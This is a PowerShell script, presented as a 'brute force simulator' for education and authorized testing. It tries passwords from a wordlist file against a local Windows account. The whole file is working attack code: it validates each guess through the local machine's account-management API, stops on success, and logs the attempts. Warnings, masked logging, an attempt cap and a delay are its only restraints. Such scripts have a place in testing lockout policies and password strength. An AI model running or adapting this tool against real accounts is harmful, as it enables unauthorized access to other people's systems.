# Windows Login Brute Force Simulator
# For educational and testing purposes only
# WARNING: Use only on test systems with proper authorization

[CmdletBinding()]
param (
    [Parameter(Mandatory=$false)]
    [ValidateNotNullOrEmpty()]
    [string]$Username = $env:USERNAME,
    [Parameter(Mandatory=$false)]
    [ValidateScript({Test-Path $_})]
    [string]$PasswordList = ".\wordlist.txt",
    [Parameter(Mandatory=$false)]
    [ValidateRange(1, 60)]
    [int]$DelaySeconds = 2,
    [Parameter(Mandatory=$false)]
    [ValidateRange(1, 1000)]
    [int]$MaxAttempts = 10
)

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    Write-Host $logMessage
    Add-Content -Path ".\bruteforce_log.txt" -Value $logMessage
}

function ConvertTo-SecureCredential {
    param (
        [Parameter(Mandatory=$true)]
        [string]$PlainTextPassword
    )
    return ConvertTo-SecureString -String $PlainTextPassword -AsPlainText -Force
}

function Test-UserCredentials {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [System.Security.SecureString]$SecurePassword
    )
    
    try {
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType)
        
        # Convert SecureString to plain text only for validation
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
        $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        
        try {
            return $principalContext.ValidateCredentials($Username, $plainPassword)
        }
        finally {
            if ($BSTR) {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
            }
            Remove-Variable -Name plainPassword -ErrorAction SilentlyContinue
        }
    }
    catch {
        Write-Log "Error testing credentials: $_"
        return $false
    }
    finally {
        if ($principalContext) {
            $principalContext.Dispose()
        }
    }
}

function Get-SystemSecurityPolicy {
    try {
        $accountPolicy = net accounts
        Write-Log "Current System Security Policy:"
        Write-Log ($accountPolicy | Out-String)
    }
    catch {
        Write-Log "Error getting system security policy: $_"
    }
}

function Start-BruteForceSimulation {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$PasswordList,
        [Parameter(Mandatory=$true)]
        [int]$DelaySeconds,
        [Parameter(Mandatory=$true)]
        [int]$MaxAttempts
    )

    Write-Log "Starting Brute Force Simulation"
    Write-Log "Target Username: $Username"
    Write-Log "Maximum Attempts: $MaxAttempts"
    Write-Log "Delay between attempts: $DelaySeconds seconds"
    
    Get-SystemSecurityPolicy
    
    if (-not (Test-Path $PasswordList)) {
        Write-Log "Error: Password list file not found at $PasswordList"
        return
    }
    
    try {
        $passwords = Get-Content $PasswordList -ErrorAction Stop
        $attemptCount = 0
        $startTime = Get-Date
        
        foreach ($password in $passwords) {
            $attemptCount++
            
            if ($attemptCount -gt $MaxAttempts) {
                Write-Log "Maximum attempts ($MaxAttempts) reached. Stopping simulation."
                break
            }
            
            Write-Log "Attempt $attemptCount - Testing password: $('*' * $password.Length)"
            
            # Convert password to SecureString
            $securePassword = ConvertTo-SecureCredential -PlainTextPassword $password
            $result = Test-UserCredentials -Username $Username -SecurePassword $securePassword
            
            # Clean up secure string
            if ($securePassword) {
                $securePassword.Dispose()
            }
            
            if ($result) {
                Write-Log "SUCCESS - Valid credentials found (Password hidden for security)"
                break
            }
            else {
                Write-Log "FAILED - Invalid credentials"
            }
            
            if ($attemptCount -lt $passwords.Count -and $attemptCount -lt $MaxAttempts) {
                Write-Log "Waiting $DelaySeconds seconds before next attempt..."
                Start-Sleep -Seconds $DelaySeconds
            }
        }
        
        $endTime = Get-Date
        $duration = $endTime - $startTime
        
        Write-Log "Simulation completed"
        Write-Log "Total attempts: $attemptCount"
        Write-Log "Total duration: $($duration.TotalMinutes.ToString('F2')) minutes"
        Write-Log "Average time per attempt: $($duration.TotalSeconds / $attemptCount) seconds"
    }
    catch {
        Write-Log "Error during simulation: $_"
    }
}

# Check if running as Administrator
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "This script requires administrative privileges. Please run as Administrator." -ForegroundColor Red
    exit
}

# Main execution
Clear-Host
Write-Host "Windows Login Brute Force Simulator" -ForegroundColor Yellow
Write-Host "WARNING: This tool is for educational purposes only." -ForegroundColor Red
Write-Host "Use only on test systems with proper authorization." -ForegroundColor Red
Write-Host ""

$confirmation = Read-Host "Do you want to continue? (yes/no)"
if ($confirmation -ne "yes") {
    Write-Host "Simulation cancelled by user."
    exit
}

Start-BruteForceSimulation -Username $Username -PasswordList $PasswordList -DelaySeconds $DelaySeconds -MaxAttempts $MaxAttempts
